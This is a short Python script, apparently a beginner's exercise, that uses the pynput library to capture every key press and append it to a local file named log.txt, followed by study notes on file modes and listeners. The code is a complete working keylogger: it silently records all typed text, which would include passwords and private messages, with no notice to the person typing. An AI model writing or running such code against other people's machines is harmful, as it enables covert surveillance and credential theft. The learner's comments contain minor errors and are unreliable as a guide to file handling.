from pynput.keyboard import Listener
def write_to_file(key):

    letter = str(key)
    letter = letter.replace("'", "")
 
    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ' '
    if letter == 'Key.cntrl_l':
        letter = ' '
    if letter == 'Key.enter':
        letter = '\n'
    if letter == 'Key.backspace':
        letter = '\n'

    if letter == 'Key.alt_l':
        letter = ''
    if letter == 'Key.tab':
        letter = ''
    if letter == 'Key.shift':
        letter = ''

    with open ('log.txt', 'a') as f:
        f.write(letter)

with Listener (on_press=write_to_file) as l:
    l.join()





#storing the keystrokes in a text file
#File Handing - how to read, write and append to a file

#f = open('log.txt', 'a')
#filedata = f.read()
#print = filedata
#f.write('\n')
#f.close()

# r - reading - ler
# w - writing - escrever 
# a - appeding to a file - anexar

#listeners - listen to keystrokes 
#use of the with keyword - release memory/resource automatically
